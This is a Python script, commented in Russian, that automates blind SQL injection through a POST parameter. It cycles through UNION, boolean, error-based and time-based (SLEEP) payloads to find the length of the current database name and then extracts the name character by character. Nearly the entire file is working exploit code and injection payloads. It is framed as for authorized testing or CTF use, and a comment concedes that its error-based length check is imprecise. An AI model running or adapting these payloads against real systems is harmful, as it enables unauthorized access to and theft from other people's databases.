"""
=============================================================================
 perebor_name_bd_universal_metod.py — универсальное извлечение имени БД
=============================================================================

ЗАЧЕМ:
    Не знаете, какой тип слепой инъекции работает? Скрипт по очереди пробует
    4 техники и сам выбирает рабочую, затем извлекает имя текущей БД:
      • union   — UNION SELECT ... IF(...,'match','miss')
      • boolean — по маркеру "under consideration"
      • error   — error-based (Duplicate entry, double-query)
      • time    — Time-Based (SLEEP)
    Сначала определяет ДЛИНУ имени БД, потом посимвольно его значение.

ГДЕ ПРИМЕНИМО:
    Первичная разведка неизвестной SQLi: быстро понять, какой класс слепой
    инъекции доступен на данном параметре, и сразу получить имя БД.

ЗАПУСК:
    python3 perebor_name_bd_universal_metod.py
    → ввести URL и имя POST-параметра.

ОГРАНИЧЕНИЯ / ЗАМЕЧАНИЯ:
    - Работает по POST; синтаксис payload фиксирован (кавычка ' + '-- -').
    - success_marker="under consideration" и error-маркер "Duplicate entry" —
      адаптируйте под ответы своей цели.
    - error-метод возвращает признак наличия, а не точную длину (см. TODO в коде).
    - Только для авторизованного тестирования / CTF.
=============================================================================
"""
import requests
import time

url = input("Введите URL цели (например, http://172.23.213.105/index.php): ").strip()
param = input("Введите имя параметра (например, name или check): ").strip()

sleep_time = 5
success_marker = "under consideration"
charset = "abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

methods = ["union", "boolean", "error", "time"]

def check_length_union():
    for length in range(1, 31):
        payload = f"1' UNION SELECT NULL, IF(LENGTH(database())={length}, 'match', 'miss')-- -"
        r = requests.post(url, data={param: payload})
        if "match" in r.text:
            return length
    return 0

def check_length_boolean():
    for length in range(1, 31):
        payload = f"1' OR LENGTH(database())={length}-- -"
        r = requests.post(url, data={param: payload})
        if success_marker in r.text:
            return length
    return 0

def check_length_error():
    for length in range(1, 31):
        payload = (
            f"1' AND (SELECT 1 FROM "
            f"(SELECT COUNT(*), CONCAT((SELECT LENGTH(database())), FLOOR(RAND()*2)) AS x "
            f"FROM information_schema.tables GROUP BY x) AS temp)-- -"
        )
        r = requests.post(url, data={param: payload})
        if "Duplicate entry" in r.text:
            return length  # Тут можно точнее, но пока просто вернуть какой-то length
    return 0

def check_length_time():
    for length in range(1, 31):
        payload = f"1' AND IF(LENGTH(database())={length}, SLEEP({sleep_time}), 0)-- -"
        start = time.time()
        requests.post(url, data={param: payload})
        elapsed = time.time() - start
        if elapsed >= sleep_time:
            return length
    return 0

length = 0
method_used = None

print("\n[+] Определение длины имени базы данных...\n")

for method in methods:
    try:
        if method == "union":
            length = check_length_union()
        elif method == "boolean":
            length = check_length_boolean()
        elif method == "error":
            length = check_length_error()
        elif method == "time":
            length = check_length_time()
    except Exception as e:
        print(f"[-] Ошибка при проверке методом {method}: {e}")
        length = 0
    
    if length > 0:
        method_used = method
        print(f"[+] Длина имени БД определена: {length} (метод: {method})\n")
        break
    else:
        print(f"[-] Метод {method} не сработал.")

if length == 0:
    print("[-] Не удалось определить длину имени базы данных ни одним из методов.")
    exit(1)

db_name = ""

print("[+] Начинаем перебор имени базы данных...\n")

for pos in range(1, length + 1):
    for char in charset:
        if method_used == "union":
            payload = f"1' UNION SELECT NULL, IF(SUBSTRING(database(),{pos},1)='{char}', 'match', 'miss')-- -"
        elif method_used == "boolean":
            payload = f"1' OR SUBSTRING(database(),{pos},1)='{char}'-- -"
        elif method_used == "error":
            payload = (
                f"1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT SUBSTRING(database(),{pos},1)), "
                f"FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) AS temp)-- -"
            )
        elif method_used == "time":
            payload = f"1' AND IF(SUBSTRING(database(),{pos},1)='{char}', SLEEP({sleep_time}), 0)-- -"
        else:
            raise ValueError("[-] Неизвестный метод")

        data = {param: payload}

        if method_used == "time":
            start = time.time()
            requests.post(url, data=data)
            elapsed = time.time() - start
            if elapsed >= sleep_time:
                db_name += char
                print(f"[{pos}] Символ найден: {char} → {db_name}")
                break
        else:
            r = requests.post(url, data=data)
            if method_used == "union" and "match" in r.text:
                db_name += char
                print(f"[{pos}] Символ найден: {char} → {db_name}")
                break
            elif method_used == "boolean" and success_marker in r.text:
                db_name += char
                print(f"[{pos}] Символ найден: {char} → {db_name}")
                break
            elif method_used == "error" and "Duplicate entry" in r.text:
                db_name += char
                print(f"[{pos}] Символ найден: {char} → {db_name}")
                break

print(f"\n[+] Имя базы данных: {db_name}")

